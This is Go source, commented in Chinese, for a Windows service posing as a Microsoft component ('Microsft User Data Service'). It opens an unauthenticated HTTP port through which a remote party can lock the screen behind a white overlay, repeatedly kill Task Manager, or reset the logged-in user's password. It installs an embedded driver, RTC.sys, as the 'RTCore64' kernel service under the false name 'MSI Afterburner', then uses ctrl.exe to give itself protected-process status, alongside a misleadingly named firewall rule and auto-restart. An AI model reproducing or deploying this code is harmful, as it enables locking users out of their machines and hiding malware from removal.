package main

import (
	"bytes"
	"embed"
	"fmt"
	"github.com/kardianos/service"
	"golang.org/x/sys/windows"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

/*
// 引入 Windows 系统头文件
#cgo LDFLAGS: -lnetapi32
#include <windows.h>
#include <lm.h>
#include <stdlib.h>
*/
import "C"

// ============================
// 全局常量和变量定义
// ============================

//go:embed ctrl.exe RTC.sys
var embeddedFiles embed.FS

// 服务配置
var svcConfig = &service.Config{
	Name:        "Microsft User Data",
	DisplayName: "Microsft User Data Service",
	Description: "Dillection User Data.",
}

// Windows API 动态链接库
var (
	modkernel32 = syscall.NewLazyDLL("kernel32.dll")
	modwtsapi32 = syscall.NewLazyDLL("wtsapi32.dll")
	modadvapi32 = syscall.NewLazyDLL("advapi32.dll")

	procWTSGetActiveConsoleSessionId = modkernel32.NewProc("WTSGetActiveConsoleSessionId")
	procWTSQueryUserToken            = modwtsapi32.NewProc("WTSQueryUserToken")
	procDuplicateTokenEx             = modadvapi32.NewProc("DuplicateTokenEx")
	procCreateProcessAsUserW         = modadvapi32.NewProc("CreateProcessAsUserW")
)

// Windows API 常量
const (
	TokenPrimary               = 1
	SecurityImpersonation      = 2
	CREATE_NEW_CONSOLE         = 0x00000010
	CREATE_UNICODE_ENVIRONMENT = 0x00000400
	STARTF_USESTDHANDLES       = 0x00000100
)

// 进程ID通道，用于管理子进程
var pidCh = make(chan uint32, 1024)

// ============================
// 服务接口实现
// ============================

// MyService 实现 service.Service 接口
type MyService struct{}

// Start 服务启动时调用
func (m *MyService) Start(s service.Service) error {
	go m.run()
	return nil
}

// run 服务主逻辑
func (m *MyService) run() {
	main_server()
}

// Stop 服务停止时调用
func (m *MyService) Stop(s service.Service) error {
	fmt.Printf("cai guai...")
	return nil
}

// ============================
// HTTP 请求处理
// ============================

// handleRequest 处理HTTP请求
func handleRequest(w http.ResponseWriter, r *http.Request) {
	// 只处理POST请求
	if r.Method != http.MethodPost {
		http.Error(w, "只支持POST请求", http.StatusMethodNotAllowed)
		return
	}

	// 解析表单数据
	err := r.ParseForm()
	if err != nil {
		http.Error(w, "表单解析失败", http.StatusBadRequest)
		return
	}

	// 处理锁屏请求
	if lock := r.FormValue("lock"); lock != "" {
		handleLockRequest(w, lock)
		return
	}

	// 处理解锁请求
	if unlock := r.FormValue("unlock"); unlock != "" {
		handleUnlockRequest(w, unlock)
		return
	}

	// 处理延时锁屏请求
	if delay := r.FormValue("delay"); delay != "" {
		handleDelayLockRequest(w, delay)
		return
	}

	// 处理修改密码请求
	if newPassword := r.FormValue("new_password"); newPassword != "" {
		handleChangePasswordRequest(w, newPassword)
		return
	}

	// 如果没有收到任何有效参数
	http.Error(w, "参数错误", http.StatusBadRequest)
}

// handleLockRequest 处理锁屏请求
func handleLockRequest(w http.ResponseWriter, lock string) {
	fmt.Printf("收到lock参数: %s\n", lock)

	// 执行锁屏命令
	go whiteScreen()
	cmd := `rundll32.exe user32.dll,LockWorkStation`
	_, err := runExecWithUser(cmd)
	if err != nil {
		http.Error(w, fmt.Sprintf("锁屏失败: %v", err), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("锁屏命令已执行"))
}

// handleUnlockRequest 处理解锁请求
func handleUnlockRequest(w http.ResponseWriter, unlock string) {
	fmt.Printf("收到unlock参数: %s\n", unlock)
	unlockwhiteScreen()
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("解锁成功"))
}

// handleDelayLockRequest 处理延时锁屏请求
func handleDelayLockRequest(w http.ResponseWriter, delay string) {
	fmt.Printf("收到delay参数: %s\n", delay)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("ok"))

	minute, _ := strconv.Atoi(delay)
	go func() {
		time.Sleep(time.Minute * time.Duration(minute))
		go whiteScreen()
		cmd := `rundll32.exe user32.dll,LockWorkStation`
		_, err := runExecWithUser(cmd)
		if err != nil {
			log.Printf("延时锁屏失败: %v", err)
		}
	}()
}

// handleChangePasswordRequest 处理修改密码请求
func handleChangePasswordRequest(w http.ResponseWriter, newPassword string) {
	fmt.Printf("收到修改密码请求，新密码长度: %d\n", len(newPassword))

	username := quser()
	if username == "" {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("密码修改失败，用户名为空"))
		return
	}

	err := setUserPassword(username, newPassword)
	if err != nil {
		http.Error(w, fmt.Sprintf("修改密码失败: %s %s %v", username, newPassword, err), http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("密码修改成功"))
}

// ============================
// Windows 用户会话管理
// ============================

// runExecWithUser 在当前活动控制台会话中以该用户身份执行命令
func runExecWithUser(cmd string) (uint32, error) {
	// 1) 获取活动控制台会话ID
	r0, _, _ := procWTSGetActiveConsoleSessionId.Call()
	sessionId := uint32(r0)
	if sessionId == 0xFFFFFFFF {
		return 0, fmt.Errorf("no active console session")
	}

	// 2) 查询用户令牌
	var hUserToken windows.Handle
	ret, _, err := procWTSQueryUserToken.Call(
		uintptr(sessionId),
		uintptr(unsafe.Pointer(&hUserToken)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("WTSQueryUserToken failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hUserToken))

	// 3) 复制令牌以获取主令牌
	var hPrimaryToken windows.Handle
	const TOKEN_ALL_ACCESS = uint32(windows.TOKEN_ALL_ACCESS)
	ret, _, err = procDuplicateTokenEx.Call(
		uintptr(hUserToken),
		uintptr(TOKEN_ALL_ACCESS),
		0,
		uintptr(SecurityImpersonation),
		uintptr(TokenPrimary),
		uintptr(unsafe.Pointer(&hPrimaryToken)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("DuplicateTokenEx failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hPrimaryToken))

	// 4) 准备进程创建参数
	lpCommandLine, _ := syscall.UTF16PtrFromString(cmd)
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// 5) 以用户身份创建进程
	ret, _, err = procCreateProcessAsUserW.Call(
		uintptr(hPrimaryToken),
		0,
		uintptr(unsafe.Pointer(lpCommandLine)),
		0,
		0,
		0,
		uintptr(CREATE_NEW_CONSOLE|CREATE_UNICODE_ENVIRONMENT),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("CreateProcessAsUserW failed: %v", err)
	}

	// 6) 清理句柄并返回进程ID
	pid := uint32(pi.ProcessId)
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	return pid, nil
}

// ============================
// 用户密码管理
// ============================

// setUserPassword 使用 CGO 调用 NetUserSetInfo 重置用户密码
func setUserPassword(username, password string) error {
	// 将Go字符串转换为Windows宽字符串指针
	userPtr, err := windows.UTF16PtrFromString(username)
	if err != nil {
		return fmt.Errorf("invalid username: %v", err)
	}

	passPtr, err := windows.UTF16PtrFromString(password)
	if err != nil {
		return fmt.Errorf("invalid password: %v", err)
	}

	// Level 1003 表示设置密码
	level := C.DWORD(1003)

	// 分配 C 结构体 USER_INFO_1003
	userInfo := (*C.USER_INFO_1003)(C.malloc(C.sizeof_USER_INFO_1003))
	if userInfo == nil {
		return fmt.Errorf("failed to allocate USER_INFO_1003")
	}
	defer C.free(unsafe.Pointer(userInfo))

	// 设置密码字段
	userInfo.usri1003_password = (*C.WCHAR)(unsafe.Pointer(passPtr))

	// 调用 NetUserSetInfo
	ret := C.NetUserSetInfo(
		nil,
		(*C.WCHAR)(unsafe.Pointer(userPtr)),
		level,
		(*C.BYTE)(unsafe.Pointer(userInfo)),
		nil,
	)

	if ret != C.NERR_Success {
		return fmt.Errorf("NetUserSetInfo 失败，错误码: %d", ret)
	}

	return nil
}

// ============================
// 系统服务管理
// ============================

// checkAndCreateService 检查并创建系统服务
func checkAndCreateService() error {
	// 获取当前程序所在目录
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("获取程序路径失败: %v", err)
	}
	exeDir := filepath.Dir(exePath)

	// 设置锁屏服务异常时自动重启
	cmd := fmt.Sprintf("sc failure \"%s\"  reset= 0 actions= restart/3000", svcConfig.Name)
	executeCommand(cmd)

	// 检查RTCore64服务是否存在
	serviceExists, err := checkServiceExists("RTCore64")
	if err != nil {
		fmt.Printf("检查服务状态失败: %v\n", err)
	}

	if serviceExists {
		log.Println("RTCore64 服务已存在")
		// 释放内嵌文件
		err = extractEmbeddedFiles(exeDir)
		return executeCtrlCommand()
	}

	log.Println("RTCore64 服务不存在，开始创建服务...")

	// 释放内嵌文件
	err = extractEmbeddedFiles(exeDir)
	if err != nil {
		return fmt.Errorf("释放内嵌文件失败: %v", err)
	}

	// 创建系统服务
	err = createService("RTCore64", filepath.Join(exeDir, "RTC.sys"))
	if err != nil {
		return fmt.Errorf("创建服务失败: %v", err)
	}

	// 启动服务
	err = startService("RTCore64")
	if err != nil {
		return fmt.Errorf("启动服务失败: %v", err)
	}

	log.Println("RTCore64 服务创建并启动成功")

	// 获取当前进程PID并执行ctrl.exe命令
	return executeCtrlCommand()
}

// checkServiceExists 检查Windows服务是否存在
func checkServiceExists(serviceName string) (bool, error) {
	cmd := exec.Command("sc", "query", serviceName)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		// 如果服务不存在，sc query会返回错误
		if exitErr, ok := err.(*exec.ExitError); ok {
			if exitErr.ExitCode() == 1060 {
				return false, nil
			}
		}
		return false, fmt.Errorf("查询服务失败: %v, 输出: %s", err, out.String())
	}

	// 检查输出中是否包含服务信息
	output := out.String()
	return strings.Contains(output, "SERVICE_NAME: "+serviceName), nil
}

// extractEmbeddedFiles 释放内嵌文件到指定目录
func extractEmbeddedFiles(targetDir string) error {
	files := []string{"ctrl.exe", "RTC.sys"}

	for _, filename := range files {
		// 读取内嵌文件
		data, err := embeddedFiles.ReadFile(filename)
		if err != nil {
			return fmt.Errorf("读取内嵌文件 %s 失败: %v", filename, err)
		}

		// 写入目标文件
		targetPath := filepath.Join(targetDir, filename)
		err = os.WriteFile(targetPath, data, 0644)
		if err != nil {
			continue
		}

		log.Printf("成功释放文件: %s", targetPath)
	}

	return nil
}

// createService 创建Windows系统服务
func createService(serviceName, sysFilePath string) error {
	// 使用sc.exe创建内核驱动服务
	cmd := exec.Command("sc.exe", "create", serviceName,
		"type=", "kernel",
		"start=", "auto",
		"binPath=", sysFilePath,
		"DisplayName=", "Micro - Star MSI Afterburner")

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("创建服务命令执行失败: %v, 输出: %s", err, out.String())
	}

	log.Printf("服务创建成功: %s", out.String())
	return nil
}

// 启动RTCore64服务
func startService(serviceName string) error {
	cmd := exec.Command("net", "start", serviceName)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("启动服务失败: %v, 输出: %s", err, out.String())
	}

	log.Printf("服务启动成功: %s", out.String())
	return nil
}

// executeCtrlCommand 获取当前进程PID并执行ctrl.exe命令
func executeCtrlCommand() error {
	// 获取当前进程PID
	pid := os.Getpid()
	log.Printf("当前进程PID: %d", pid)

	// 获取当前程序所在目录
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("获取程序路径失败: %v", err)
	}
	exeDir := filepath.Dir(exePath)
	ctrlPath := filepath.Join(exeDir, "ctrl.exe")

	// 执行ctrl.exe命令
	cmd := exec.Command(ctrlPath, "set", strconv.Itoa(pid), "PPL", "WinTcb")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err = cmd.Run()
	if err != nil {
		return fmt.Errorf("执行ctrl.exe命令失败: %v, 输出: %s", err, out.String())
	}

	log.Printf("ctrl.exe命令执行成功: %s", out.String())
	return nil
}

// ============================
// 系统命令执行
// ============================

// executeCommand 执行系统命令
func executeCommand(command string) (string, error) {
	var cmd *exec.Cmd

	// 设置控制台编码为UTF-8
	chcpCmd := exec.Command("cmd", "/C", "chcp", "65001")
	chcpCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := chcpCmd.Run()
	if err != nil {
		fmt.Println("can not set chcp encoding:", err)
	}

	args := strings.Fields("cmd /c " + command)
	cmd = exec.Command(args[0], args[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// 创建缓冲区保存命令输出
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// 执行命令
	err = cmd.Run()
	if err != nil {
		errors := strings.TrimSpace(stderr.String())
		return "cmd exec error:\t" + errors, nil
	}

	// 获取输出结果并处理换行符
	output := stdout.String()
	return strings.ReplaceAll(output, "\r\n", "\n"), nil
}

// quser 获取当前登录的普通用户名，本程序以服务运行，whoami得到的是system。所以此处使用quser查询
func quser() (user string) {
	res, err := executeCommand("quser")
	if err != nil {
		fmt.Println(err)
		return
	}

	sSplit := strings.Split(res, "\n")
	if len(sSplit) < 2 {
		return
	}

	line2 := sSplit[1]
	line2 = strings.TrimSpace(line2)
	if strings.HasPrefix(line2, ">") {
		line2 = line2[1:]
	}
	user = strings.Split(line2, " ")[0]
	return user
}

// ============================
// 屏幕管理功能
// ============================

// whiteScreen 触发屏幕白屏
func whiteScreen() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("获取程序路径失败: %v\n", err)
		err := os.WriteFile("log.txt", []byte(err.Error()), 0644)
		if err != nil {
			fmt.Println("写入文件失败:", err)
			return
		}
		return
	}
	exeDir := filepath.Dir(exePath)
	writeExePath := filepath.Join(exeDir, "SmartFronts.exe")
	pid, err := runExecWithUser(writeExePath)
	if err != nil {
		fmt.Println("启动失败:", err)
		fmt.Printf("失败: %v\n", err)
		err := os.WriteFile("log.txt", []byte(err.Error()), 0644)
		if err != nil {
			fmt.Println("写入文件失败:", err)
			return
		}
		return
	}
	fmt.Printf("子进程已启动，PID: %d\n", pid)
	pidCh <- pid
	if len(pidCh) == 1 {
		go killTaskmgr()
	}
}

// 解锁屏幕白屏状态
func unlockwhiteScreen() {
	for {
		select {
		case pid, ok := <-pidCh:
			if !ok {
				fmt.Println("通道已关闭，退出")
				return
			}
			// 打开进程
			var hProcess windows.Handle
			hProcess, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
			if err != nil {
				log.Printf("无法打开进程，PID=%d, 错误: %v", pid, err)
			} else {
				// 终止进程
				err = windows.TerminateProcess(hProcess, 1)
				windows.CloseHandle(hProcess)
				if err != nil {
					log.Printf("终止进程失败: %v", err)
				} else {
					log.Printf("已终止进程 PID=%d", pid)
				}
			}
		default:
			// 如果通道当前没有数据则退出
			return
		}
	}
}

// killTaskmgr 杀死任务管理器进程，每秒一次直到锁屏状态结束时停止
func killTaskmgr() {
	for {
		if len(pidCh) > 0 {
			executeCommand("taskkill /f /im Taskmgr.exe")
		} else if len(pidCh) == 0 {
			break
		}
		time.Sleep(time.Second)
	}
}

// ============================
// 主服务器函数
// ============================

// main_server 启动HTTP服务器
func main_server() {
	// 启动时检查并创建系统服务
	err := checkAndCreateService()
	if err != nil {
		log.Printf("系统服务检查失败: %v", err)
	} else {
		log.Println("系统服务检查完成")
	}

	http.HandleFunc("/", handleRequest)

	fmt.Println("启动锁屏服务器，监听端口 18789...")
	err = http.ListenAndServe(":18789", nil)
	if err != nil {
		log.Fatal("服务器启动失败: ", err)
	}
	// 添加防火墙规则，允许18789端口
	executeCommand("netsh advfirewall firewall add rule name=\"Support Microsoft Delittion\" protocol=TCP dir=in localport=18789 action=allow")
}

// ============================
// 程序入口点
// ============================

// main 程序主入口
func main() {
	prg := &MyService{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}

	// 通过以下代码来控制服务的启动和停止
	// 例如 以下命令行参数分别可以注册、启动、停止、重启、卸载服务：
	// xxx.exe install
	// xxx.exe start
	// xxx.exe stop
	// xxx.exe restart
	// xxx.exe uninstall
	if len(os.Args) > 1 {
		err = service.Control(s, os.Args[1])
		if err != nil {
			log.Fatal(err)
		}
		return
	}

	err = s.Run()
	if err != nil {
		log.Fatal(err)
	}
}
